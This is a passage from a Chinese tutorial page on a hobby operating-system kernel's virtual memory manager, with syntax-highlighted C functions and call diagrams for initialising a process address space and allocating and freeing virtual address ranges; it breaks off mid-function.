<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化全局变量 initmmadrsdsc  </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mmadrsdsc_t_init</span><span class="params">(<span class="type">mmadrsdsc_t</span>* initp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="literal">NULL</span> == initp)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">krlspinlock_init</span>(&amp;initp-&gt;msd_lock);</span><br><span class="line">	<span class="built_in">list_init</span>(&amp;initp-&gt;msd_list);</span><br><span class="line">	initp-&gt;msd_flag = <span class="number">0</span>;</span><br><span class="line">	initp-&gt;msd_stus = <span class="number">0</span>;</span><br><span class="line">	initp-&gt;msd_scount = <span class="number">0</span>;</span><br><span class="line">	initp-&gt;msd_thread = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">krlsem_t_init</span>(&amp;initp-&gt;msd_sem);</span><br><span class="line">	<span class="built_in">krlsem_set_sem</span>(&amp;initp-&gt;msd_sem, SEM_FLG_MUTEX, SEM_MUTEX_ONE_LOCK);</span><br><span class="line">	<span class="built_in">mmudsc_t_init</span>(&amp;initp-&gt;msd_mmu);</span><br><span class="line">	<span class="built_in">virmemadrs_t_init</span>(&amp;initp-&gt;msd_virmemadrs);</span><br><span class="line">	initp-&gt;msd_stext = <span class="number">0</span>;</span><br><span class="line">	initp-&gt;msd_etext = <span class="number">0</span>;</span><br><span class="line">	initp-&gt;msd_sdata = <span class="number">0</span>;</span><br><span class="line">	initp-&gt;msd_edata = <span class="number">0</span>;</span><br><span class="line">	initp-&gt;msd_sbss = <span class="number">0</span>;</span><br><span class="line">	initp-&gt;msd_ebss = <span class="number">0</span>;</span><br><span class="line">	initp-&gt;msd_sbrk = <span class="number">0</span>;</span><br><span class="line">	initp-&gt;msd_ebrk = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>kvma_inituserspace_virmemadrs 函数功能：初始化进程的用户空间。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化进程虚拟地址空间</span></span><br><span class="line"><span class="function"><span class="type">bool_t</span> <span class="title">kvma_inituserspace_virmemadrs</span><span class="params">(<span class="type">virmemadrs_t</span> *vma)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">kmvarsdsc_t</span> *kmvdc = <span class="literal">NULL</span>, *stackkmvdc = <span class="literal">NULL</span>, *heapkmvdc = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == vma)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//分配一个进程的内存地址空间 kmvarsdsc_t </span></span><br><span class="line">	kmvdc = <span class="built_in">new_kmvarsdsc</span>();</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == kmvdc)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	heapkmvdc = <span class="built_in">new_kmvarsdsc</span>();</span><br><span class="line">	<span class="keyword">if</span>(<span class="literal">NULL</span> == heapkmvdc)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">del_kmvarsdsc</span>(kmvdc);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 分配一个栈区的 kmvarsdsc_t </span></span><br><span class="line">	stackkmvdc = <span class="built_in">new_kmvarsdsc</span>();</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == stackkmvdc)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">del_kmvarsdsc</span>(kmvdc);</span><br><span class="line">		<span class="built_in">del_kmvarsdsc</span>(heapkmvdc);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 虚拟区间开始地址 0x1000 4K</span></span><br><span class="line">	kmvdc-&gt;kva_start = USER_VIRTUAL_ADDRESS_START + <span class="number">0x1000</span>;</span><br><span class="line">	<span class="comment">// 虚拟区间结束地址 0x5000</span></span><br><span class="line">	kmvdc-&gt;kva_end = kmvdc-&gt;kva_start + <span class="number">0x4000</span>;</span><br><span class="line">	kmvdc-&gt;kva_mcstruct = vma; </span><br><span class="line"></span><br><span class="line">	heapkmvdc-&gt;kva_start = THREAD_HEAPADR_START;</span><br><span class="line">	heapkmvdc-&gt;kva_end = heapkmvdc-&gt;kva_start + <span class="number">0x1000</span>;</span><br><span class="line">	heapkmvdc-&gt;kva_mcstruct = vma;</span><br><span class="line">	heapkmvdc-&gt;kva_maptype = KMV_HEAP_TYPE;</span><br><span class="line">	<span class="comment">//栈虚拟区间开始地址 USER_VIRTUAL_ADDRESS_END - 0x40000000</span></span><br><span class="line">	stackkmvdc-&gt;kva_start = <span class="built_in">PAGE_ALIGN</span>(USER_VIRTUAL_ADDRESS_END - <span class="number">0x40000000</span>);</span><br><span class="line">	<span class="comment">//栈虚拟区间结束地址 USER_VIRTUAL_ADDRESS_END</span></span><br><span class="line">	stackkmvdc-&gt;kva_end = USER_VIRTUAL_ADDRESS_END;</span><br><span class="line">	stackkmvdc-&gt;kva_mcstruct = vma;</span><br><span class="line">	stackkmvdc-&gt;kva_maptype = KMV_STACK_TYPE;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">krlspinlock_lock</span>(&amp;vma-&gt;vs_lock);</span><br><span class="line">	vma-&gt;vs_isalcstart = USER_VIRTUAL_ADDRESS_START;</span><br><span class="line">	vma-&gt;vs_isalcend = USER_VIRTUAL_ADDRESS_END;</span><br><span class="line">	<span class="comment">//设置虚拟地址空间的开始区间为kmvdc</span></span><br><span class="line">	vma-&gt;vs_startkmvdsc = kmvdc;</span><br><span class="line">	vma-&gt;vs_endkmvdsc = stackkmvdc;</span><br><span class="line">	vma-&gt;vs_heapkmvdsc = heapkmvdc;</span><br><span class="line">	<span class="comment">//设置虚拟地址空间的开始区间为栈区</span></span><br><span class="line">	vma-&gt;vs_stackkmvdsc = stackkmvdc;</span><br><span class="line">	<span class="comment">//加入链表</span></span><br><span class="line">	<span class="built_in">list_add_tail</span>(&amp;kmvdc-&gt;kva_list, &amp;vma-&gt;vs_list);</span><br><span class="line">	<span class="built_in">list_add_tail</span>(&amp;heapkmvdc-&gt;kva_list, &amp;vma-&gt;vs_list);</span><br><span class="line">	<span class="built_in">list_add_tail</span>(&amp;stackkmvdc-&gt;kva_list, &amp;vma-&gt;vs_list);</span><br><span class="line">	<span class="comment">// 计数加3</span></span><br><span class="line">	vma-&gt;vs_kmvdscnr += <span class="number">3</span>;</span><br><span class="line">	<span class="built_in">krlspinlock_unlock</span>(&amp;vma-&gt;vs_lock);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>new_kmvarsdsc 函数主要功能：为 kmvarsdsc_t 结构申请一块内存空间，并初始化。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 申请内存空间</span></span><br><span class="line"><span class="function"><span class="type">kmvarsdsc_t</span> *<span class="title">new_kmvarsdsc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">kmvarsdsc_t</span> *kmvdc = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">// 分配内存对象</span></span><br><span class="line">	kmvdc = (<span class="type">kmvarsdsc_t</span> *)<span class="built_in">kmsob_new</span>(<span class="built_in">sizeof</span>(<span class="type">kmvarsdsc_t</span>));</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == kmvdc)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 初始化</span></span><br><span class="line">	<span class="built_in">kmvarsdsc_t_init</span>(kmvdc);</span><br><span class="line">	<span class="keyword">return</span> kmvdc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分配虚拟地址"><a href="#分配虚拟地址" class="headerlink" title="分配虚拟地址"></a>分配虚拟地址</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@startuml</span><br><span class="line">vma_new_vadrs -&gt; vma_new_vadrs_core : 调用虚拟地址空间分配的核心函数。</span><br><span class="line">vma_new_vadrs_core -&gt; vma_find_kmvarsdsc : 查找虚拟地址区间。</span><br><span class="line">vma_find_kmvarsdsc -&gt; vma_find_kmvarsdsc_is_ok : 先检查当前 kmvarsdsc_t 结构行不行。</span><br><span class="line">vma_new_vadrs_core -&gt; new_kmvarsdsc : 建立一个新的 kmvarsdsc_t 虚拟地址区间结构。</span><br><span class="line">new_kmvarsdsc -&gt; kmsob_new : 分配内存对象。</span><br><span class="line">new_kmvarsdsc -&gt; kmvarsdsc_t_init : 初始化进程内存地址空间。</span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure>

<p>vma_new_vadrs 函数功能：判断用户申请的地址是否合法，然后调用虚拟地址空间分配的核心函数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 分配虚拟地址空间的接口，这里允许用户指定地址</span></span><br><span class="line"><span class="function"><span class="type">adr_t</span> <span class="title">vma_new_vadrs</span><span class="params">(<span class="type">mmadrsdsc_t</span> *mm, <span class="type">adr_t</span> start, <span class="type">size_t</span> vassize, <span class="type">u64_t</span> vaslimits, <span class="type">u32_t</span> vastype)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == mm || <span class="number">1</span> &gt; vassize)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> != start)</span><br><span class="line">	&#123;	<span class="comment">// 进行参数检查，开始地址要和页面（4KB）对齐，并且要大于 4K，原因见 kvma_inituserspace_virmemadrs 函数，</span></span><br><span class="line">		<span class="comment">// 结束地址不能超过整个虚拟地址空间</span></span><br><span class="line">		<span class="keyword">if</span> (((start &amp; <span class="number">0xfff</span>) != <span class="number">0</span>) || (<span class="number">0x1000</span> &gt; start) || (USER_VIRTUAL_ADDRESS_END &lt; (start + vassize)))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 调用虚拟地址空间分配的核心函数</span></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">vma_new_vadrs_core</span>(mm, start, <span class="built_in">VADSZ_ALIGN</span>(vassize), vaslimits, vastype);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vma_new_vadrs_core 函数功能：找到 virmemadrs_t -&gt; vs_list 链表中合适的 kmvarsdsc_t 内存区间，并分配空间。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 虚拟地址空间分配的核心函数</span></span><br><span class="line"><span class="function"><span class="type">adr_t</span> <span class="title">vma_new_vadrs_core</span><span class="params">(<span class="type">mmadrsdsc_t</span> *mm, <span class="type">adr_t</span> start, <span class="type">size_t</span> vassize, <span class="type">u64_t</span> vaslimits, <span class="type">u32_t</span> vastype)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">adr_t</span> retadrs = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">kmvarsdsc_t</span> *newkmvd = <span class="literal">NULL</span>, *currkmvd = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">virmemadrs_t</span> *vma = &amp;mm-&gt;msd_virmemadrs;</span><br><span class="line">	<span class="type">cpuflg_t</span> cpuflg;</span><br><span class="line">	<span class="built_in">krlspinlock_cli</span>(&amp;vma-&gt;vs_lock, &amp;cpuflg);</span><br><span class="line">	<span class="comment">// 查找 virmemadrs_t 结构中的所有 kmvarsdsc_t 结构，找出合适的虚拟地址区间。</span></span><br><span class="line">	currkmvd = <span class="built_in">vma_find_kmvarsdsc</span>(vma, start, vassize, vaslimits, vastype);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == currkmvd)</span><br><span class="line">	&#123;</span><br><span class="line">		retadrs = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//进行虚拟地址区间进行检查看能否复用这个数据结构</span></span><br><span class="line">	<span class="keyword">if</span> (((<span class="literal">NULL</span> == start) || (start == currkmvd-&gt;kva_end)) &amp;&amp; (vaslimits == currkmvd-&gt;kva_limits) &amp;&amp; (vastype == currkmvd-&gt;kva_maptype))</span><br><span class="line">	&#123;	<span class="comment">//能复用的话，当前虚拟地址区间的结束地址返回</span></span><br><span class="line">		retadrs = currkmvd-&gt;kva_end;</span><br><span class="line">		<span class="comment">//扩展当前虚拟地址区间的结束地址为分配虚拟地址区间的大小</span></span><br><span class="line">		currkmvd-&gt;kva_end += vassize;</span><br><span class="line">		vma-&gt;vs_currkmvdsc = currkmvd;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//建立一个新的kmvarsdsc_t虚拟地址区间结构</span></span><br><span class="line">	newkmvd = <span class="built_in">new_kmvarsdsc</span>();</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == newkmvd)</span><br><span class="line">	&#123;</span><br><span class="line">		retadrs = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//如果分配的开始地址为NULL就由系统动态决定</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == start)</span><br><span class="line">	&#123;	<span class="comment">//当然是接着当前虚拟地址区间之后开始</span></span><br><span class="line">		newkmvd-&gt;kva_start = currkmvd-&gt;kva_end;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;	<span class="comment">//否则这个新的虚拟地址区间的开始就是请求分配的开始地址</span></span><br><span class="line">		newkmvd-&gt;kva_start = start;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//设置新的虚拟地址区间的结束地址</span></span><br><span class="line">	newkmvd-&gt;kva_end = newkmvd-&gt;kva_start + vassize;</span><br><span class="line">	newkmvd-&gt;kva_limits = vaslimits;</span><br><span class="line">	newkmvd-&gt;kva_maptype = vastype;</span><br><span class="line">	newkmvd-&gt;kva_mcstruct = vma;</span><br><span class="line">	vma-&gt;vs_currkmvdsc = newkmvd;</span><br><span class="line">	<span class="comment">//将新的虚拟地址区间加入到virmemadrs_t结构中</span></span><br><span class="line">	<span class="built_in">list_add</span>(&amp;newkmvd-&gt;kva_list, &amp;currkmvd-&gt;kva_list);</span><br><span class="line">	<span class="comment">//看看新的虚拟地址区间是否是最后一个</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">list_is_last</span>(&amp;newkmvd-&gt;kva_list, &amp;vma-&gt;vs_list) == TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		vma-&gt;vs_endkmvdsc = newkmvd;</span><br><span class="line">	&#125;</span><br><span class="line"> 	<span class="comment">//返回新的虚拟地址区间的开始地址</span></span><br><span class="line">	retadrs = newkmvd-&gt;kva_start;</span><br><span class="line">out:</span><br><span class="line">	<span class="built_in">krlspinunlock_sti</span>(&amp;vma-&gt;vs_lock, &amp;cpuflg);</span><br><span class="line">	<span class="keyword">return</span> retadrs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vma_find_kmvarsdsc 函数的功能：查找 virmemadrs_t 结构中的所有 kmvarsdsc_t 结构，找出合适的虚拟地址区间。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检查 kmvarsdsc_t 结构</span></span><br><span class="line"><span class="function"><span class="type">kmvarsdsc_t</span> *<span class="title">vma_find_kmvarsdsc_is_ok</span><span class="params">(<span class="type">virmemadrs_t</span> *vmalocked, <span class="type">kmvarsdsc_t</span> *curr, <span class="type">adr_t</span> start, <span class="type">size_t</span> vassize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">kmvarsdsc_t</span> *nextkmvd = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">adr_t</span> newend = start + (<span class="type">adr_t</span>)vassize;</span><br><span class="line">	  <span class="comment">// 先检查当前 kmvarsdsc_t 结构是不是最后一个</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">list_is_last</span>(&amp;curr-&gt;kva_list, &amp;vmalocked-&gt;vs_list) == FALSE)</span><br><span class="line">	&#123;	<span class="comment">// 如果不是，就获取 curr 的下一个 kmvarsdsc_t 结构,这样就可以获取到当前虚拟内存的结束地址。</span></span><br><span class="line">		nextkmvd = <span class="built_in">list_next_entry</span>(curr, <span class="type">kmvarsdsc_t</span>, kva_list);</span><br><span class="line">		<span class="comment">// 由系统动态决定分配虚拟空间的开始地址</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> == start)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// 如果 curr 的结束地址加上分配的大小小于等于下一个 kmvarsdsc_t 结构的开始地址就返回 curr</span></span><br><span class="line">			<span class="keyword">if</span> ((curr-&gt;kva_end + (<span class="type">adr_t</span>)vassize) &lt;= nextkmvd-&gt;kva_start)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> curr;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123; 	<span class="comment">// 否则比较应用指定分配的开始、结束地址是不是在 curr 和下一个 kmvarsdsc_t 结构之间</span></span><br><span class="line">			<span class="keyword">if</span> ((curr-&gt;kva_end &lt;= start) &amp;&amp; (newend &lt;= nextkmvd-&gt;kva_start))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> curr;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;	<span class="comment">// 否则 curr 为最后一个 kmvarsdsc_t 结构</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> == start)</span><br><span class="line">		&#123;	<span class="comment">// curr 的结束地址加上分配空间的大小是不是小于整个虚拟地址空间</span></span><br><span class="line">			<span class="keyword">if</span> ((curr-&gt;kva_end + (<span class="type">adr_t</span>)vassize) &lt; vmalocked-&gt;vs_isalcend)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> curr;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;	<span class="comment">// 否则比较应用指定分配的开始、结束地址是不是在 curr 的结束地址和整个虚拟地址空间的结束地址之间</span></span><br><span class="line">			<span class="keyword">if</span> ((curr-&gt;kva_end &lt;= start) &amp;&amp; (newend &lt; vmalocked-&gt;vs_isalcend))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> curr;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查找合适的 kmvarsdsc_t 结构</span></span><br><span class="line"><span class="function"><span class="type">kmvarsdsc_t</span> *<span class="title">vma_find_kmvarsdsc</span><span class="params">(<span class="type">virmemadrs_t</span> *vmalocked, <span class="type">adr_t</span> start, <span class="type">size_t</span> vassize, <span class="type">u64_t</span> vaslimits, <span class="type">u32_t</span> vastype)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">kmvarsdsc_t</span> *kmvdcurrent = <span class="literal">NULL</span>, *curr = vmalocked-&gt;vs_currkmvdsc;</span><br><span class="line">	<span class="type">adr_t</span> newend = start + vassize;</span><br><span class="line">	<span class="type">list_h_t</span> *listpos = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">// 分配的虚拟空间大小 小于 4KB 不行</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0x1000</span> &gt; vassize)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 将要分配虚拟地址空间的结束地址大于整个虚拟地址空间 不行</span></span><br><span class="line">	<span class="keyword">if</span> (newend &gt; vmalocked-&gt;vs_isalcend)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> != curr)</span><br><span class="line">	&#123;	<span class="comment">// 先检查当前 kmvarsdsc_t 结构行不行</span></span><br><span class="line">		kmvdcurrent = <span class="built_in">vma_find_kmvarsdsc_is_ok</span>(vmalocked, curr, start, vassize);</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> != kmvdcurrent)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(vaslimits == kmvdcurrent-&gt;kva_limits &amp;&amp; vastype == kmvdcurrent-&gt;kva_maptype)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> kmvdcurrent;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//遍历 virmemadrs_t 中的所有的 kmvarsdsc_t 结构</span></span><br><span class="line">	<span class="built_in">list_for_each</span>(listpos, &amp;vmalocked-&gt;vs_list)</span><br><span class="line">	&#123;</span><br><span class="line">		curr = <span class="built_in">list_entry</span>(listpos, <span class="type">kmvarsdsc_t</span>, kva_list);</span><br><span class="line">		<span class="keyword">if</span>(vaslimits == curr-&gt;kva_limits &amp;&amp; vastype == curr-&gt;kva_maptype)</span><br><span class="line">		&#123;	<span class="comment">//检查每个 kmvarsdsc_t 结构</span></span><br><span class="line">			kmvdcurrent = <span class="built_in">vma_find_kmvarsdsc_is_ok</span>(vmalocked, curr, start, vassize);</span><br><span class="line">			<span class="keyword">if</span> (<span class="literal">NULL</span> != kmvdcurrent)</span><br><span class="line">			&#123;	<span class="comment">// 如果符合要求就返回</span></span><br><span class="line">				<span class="keyword">return</span> kmvdcurrent;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="释放虚拟地址"><a href="#释放虚拟地址" class="headerlink" title="释放虚拟地址"></a>释放虚拟地址</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@startuml</span><br><span class="line">vma_del_vadrs -&gt; vma_del_vadrs_core : 调用虚拟地址空间释放核心处理函数。</span><br><span class="line">vma_del_vadrs_core -&gt; vma_del_find_kmvarsdsc : 查找要释放虚拟地址空间的 kmvarsdsc_t 结构。</span><br><span class="line">vma_find_kmvarsdsc -&gt; vma_find_kmvarsdsc_is_ok : 先检查当前 kmvarsdsc_t 结构行不行。</span><br><span class="line">vma_new_vadrs_core -&gt; new_kmvarsdsc : 建立一个新的 kmvarsdsc_t 虚拟地址区间结构。</span><br><span class="line">new_kmvarsdsc -&gt; kmsob_new : 分配内存对象。</span><br><span class="line">new_kmvarsdsc -&gt; kmvarsdsc_t_init : 初始化进程内存地址空间。</span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure>

<p>vma_del_vadrs 函数功能：释放虚拟地址空间的接口，主要调用虚拟地址空间释放核心处理函数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 释放虚拟地址空间的接口</span></span><br><span class="line"><span class="function"><span class="type">bool_t</span> <span class="title">vma_del_vadrs</span><span class="params">(<span class="type">mmadrsdsc_t</span> *mm, <span class="type">adr_t</span> start, <span class="type">size_t</span> vassize)</span></span></span><br><span class="line"><span class="function"></span>&#123;	<span class="comment">//对参数进行检查</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == mm || <span class="number">1</span> &gt; vassize || <span class="literal">NULL</span> == start)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 调用核心处理函数</span></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">vma_del_vadrs_core</span>(mm, start, <span class="built_in">VADSZ_ALIGN</span>(vassize));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vma_del_vadrs_core 函数功能：释放虚拟地址空间的核心函数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//释放虚拟地址空间的核心函数</span></span><br><span class="line"><span class="function"><span class="type">bool_t</span> <span class="title">vma_del_vadrs_core</span><span class="params">(<span class="type">mmadrsdsc_t</span> *mm, <span class="type">adr_t</span> start, <span class="type">size_t</span> vassize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">bool_t</span> rets = FALSE;</span><br><span class="line">    <span class="type">kmvarsdsc_t</span> *newkmvd = <span class="literal">NULL</span>, *delkmvd = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">virmemadrs_t</span> *vma = &amp;mm-&gt;msd_virmemadrs;</span><br><span class="line">    <span class="built_in">knl_spinlock</span>(&amp;vma-&gt;vs_lock);</span><br><span class="line">    <span class="comment">//查找要释放虚拟地址空间的kmvarsdsc_t结构</span></span><br><span class="line">    delkmvd = <span class="built_in">vma_del_find_kmvarsdsc</span>(vma, start, vassize);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == delkmvd)</span><br><span class="line">    &#123;</span><br><span class="line">        rets = FALSE;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//第一种情况要释放的虚拟地址空间正好等于查找的kmvarsdsc_t结构</span></span><br><span class="line">    <span class="keyword">if</span> ((delkmvd-&gt;kva_start == start) &amp;&amp; (delkmvd-&gt;kva_end == (start + (<span class="type">adr_t</span>)vassize)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//脱链</span></span><br><span class="line">        <span class="built_in">list_del</span>(&amp;delkmvd-&gt;kva_list);</span><br><span class="line">        <span class="comment">//删除kmvarsdsc_t结构</span></span><br><span class="line">        <span class="built_in">del_kmvarsdsc</span>(delkmvd);</span><br><span class="line">        vma-&gt;vs_kmvdscnr--;</span><br><span class="line">        rets = TRUE;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//第二种情况要释放的虚拟地址空间是在查找的kmvarsdsc_t结构的上半部分</span></span><br><span class="line">    <span class="keyword">if</span> ((delkmvd-&gt;kva_start == start) &amp;&amp; (delkmvd-&gt;kva_end &gt; (start + (<span class="type">adr_t</span>)vassize)))</span><br><span class="line">    &#123;    <span class="comment">//所以直接把查找的kmvarsdsc_t结构的开始地址设置为释放虚拟地址空间的结束地址</span></span><br><span class="line">        delkmvd-&gt;kva_start = start + (<span class="type">adr_t</span>)vassize;</span><br><span class="line">        rets = TRUE;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//第三种情况要释放的虚拟地址空间是在查找的kmvarsdsc_t结构的下半部分</span></span><br><span class="line">    <span class="keyword">if</span> ((delkmvd-&gt;kva_start &lt; start) &amp;&amp; (delkmvd-&gt;kva_end == (start + (<span class="type">adr_t</span>)vassize)))</span><br><span class="line">    &#123;<span class="comment">//所以直接把查找的kmvarsdsc_t结构的结束地址设置为释放虚拟地址空间的开始地址</span></span><br><span class="line">        delkmvd-&gt;kva_end = start;</span><br><span class="line">        rets = TRUE;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//第四种情况要释放的虚拟地址空间是在查找的kmvarsdsc_t结构的中间</span></span><br><span class="line">    <span class="keyword">if</span> ((delkmvd-&gt;kva_start &lt; start) &amp;&amp; (delkmvd-&gt;kva_end &gt; (start + (<span class="type">adr_t</span>)vassize)))</span><br><span class="line">    &#123;<span class="comment">//所以要再新建一个kmvarsdsc_t结构来处理释放虚拟地址空间之后的下半虚拟部分地址空间</span></span><br><span class="line">        newkmvd = <span class="built_in">new_kmvarsdsc</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> == newkmvd)</span><br><span class="line">        &#123;</span><br><span class="line">            rets = FALSE;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//让新的kmvarsdsc_t结构指向查找的kmvarsdsc_t结构的后半部分虚拟地址空间</span></span><br><span class="line">        newkmvd-&gt;kva_end = delkmvd-&gt;kva_end;</span><br><span class="line">        newkmvd-&gt;kva_start = start + (<span class="type">adr_t</span>)vassize;</span><br><span class="line">        <span 